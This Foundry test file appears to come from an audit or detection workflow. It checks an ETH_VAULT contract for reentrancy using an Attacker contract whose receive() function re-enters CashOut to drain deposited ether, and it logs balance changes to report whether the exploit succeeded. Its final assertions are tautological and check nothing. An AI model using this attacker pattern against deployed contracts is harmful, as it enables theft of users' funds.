// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x8c7777c45481dba411450c228cb692ac3d550344.sol";

contract ReentrancyTest is Test {
    ETH_VAULT vault;
    Log logContract;
    Attacker attacker;
    address owner = makeAddr("owner");
    
    function setUp() public {
        vm.deal(owner, 10 ether);
        vm.prank(owner);
        
        logContract = new Log();
        vault = new ETH_VAULT(address(logContract));
        attacker = new Attacker(payable(address(vault)));
        
        vm.deal(address(attacker), 1.5 ether);
    }

    function testReentrancyVulnerability() public {
        // 记录攻击前的状态
        console.log("--- BEFORE-Trigger State ---");
        uint256 vaultEthBalanceBefore = address(vault).balance;
        uint256 attackerEthBalanceBefore = address(attacker).balance;
        uint256 attackerVaultBalanceBefore = vault.balances(address(attacker));
        
        console.log("Vault Contract Balance (ETH): %s", vaultEthBalanceBefore);
        console.log("Attacker Contract Balance (ETH): %s", attackerEthBalanceBefore);
        console.log("Attacker's Balance in Vault: %s", attackerVaultBalanceBefore);

        console.log("--- Trigger Attack ---");
        // 执行攻击操作
        attacker.attack();

        console.log("--- AFTER-Trigger State ---");
        // 记录攻击后的状态
        uint256 vaultEthBalanceAfter = address(vault).balance;
        uint256 attackerEthBalanceAfter = address(attacker).balance;
        uint256 attackerVaultBalanceAfter = vault.balances(address(attacker));
        
        console.log("Vault Contract Balance (ETH): %s", vaultEthBalanceAfter);
        console.log("Attacker Contract Balance (ETH): %s", attackerEthBalanceAfter);
        console.log("Attacker's Balance in Vault: %s", attackerVaultBalanceAfter);

        // 比较状态变化
        console.log("--- Differential Check Results ---");
        bool vaultBalanceReduced = (vaultEthBalanceAfter < vaultEthBalanceBefore);
        bool attackerBalanceIncreased = (attackerEthBalanceAfter > attackerEthBalanceBefore);
        uint256 vaultBalanceChange = vaultEthBalanceBefore - vaultEthBalanceAfter;
        uint256 attackerBalanceChange = attackerEthBalanceAfter - attackerEthBalanceBefore;
        
        console.log("Vault Balance Reduction: %s (Change: %d)", vaultBalanceReduced, vaultBalanceChange);
        console.log("Attacker Balance Increase: %s (Change: %d)", attackerBalanceIncreased, attackerBalanceChange);
        console.log("Attacker's Vault Balance Cleared: %s", (attackerVaultBalanceAfter == 0));
        
        // 漏洞存在条件：金库ETH减少 + 攻击者ETH增加 + 攻击者金库余额被清零
        bool vulnerabilityExploited = vaultBalanceReduced && 
                                     attackerBalanceIncreased && 
                                     attackerVaultBalanceAfter == 0 &&
                                     vaultBalanceChange > 0 && 
                                     attackerBalanceChange > 0 &&
                                     vaultBalanceChange == attackerBalanceChange;
        
        console.log("Vulnerability Exploited: %s", vulnerabilityExploited ? "Yes" : "No");
        
        // 最终漏洞判断
        if (vulnerabilityExploited) {
            console.log("Vulnerability Exists: Successful reentrancy attack drained vault ETH abnormally");
        } else {
            console.log("Vulnerability not Exist: No abnormal balance changes detected");
        }

        // 原始断言保留
        assertEq(address(attacker).balance, attackerEthBalanceAfter, "Attacker ETH balance mismatch");
        assertEq(vault.balances(address(attacker)), attackerVaultBalanceAfter, "Attacker vault balance mismatch");
    }
}

contract Attacker {
    ETH_VAULT public vault;
    bool private attacking;

    constructor(address payable _vault) {
        vault = ETH_VAULT(_vault);
    }

    function attack() external payable {
        // Deposit to establish balance
        vault.Deposit{value: 1.5 ether}();
        // Start the reentrancy attack
        attacking = true;
        vault.CashOut(1 ether);
    }

    // Re-enter the CashOut function when receiving ETH
    receive() external payable {
        if (attacking) {
            // Prevent further re-entrancy
            attacking = false;
            // Re-enter and withdraw remaining funds
            vault.CashOut(0.5 ether);
        }
    }
}